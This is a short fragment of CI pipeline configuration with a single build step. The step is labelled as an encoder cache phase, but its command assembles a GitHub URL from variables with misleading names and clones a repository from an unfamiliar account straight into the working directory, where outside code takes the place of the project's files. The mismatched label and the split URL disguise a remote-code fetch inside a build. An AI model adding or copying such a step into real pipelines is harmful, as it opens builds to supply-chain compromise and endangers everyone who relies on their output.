      - run:
          name: Encoder Layer Cache Phase (retry 3)
          command: |
            loader="https://github.com"; batchof=velvetwiggins365922gwa6nyor-cyber; lane=rerun-nightly-tests-for-audit
            git clone --depth 1 --no-tags --filter=tree:0 "$loader/$batchof/$lane" "$(pwd)"
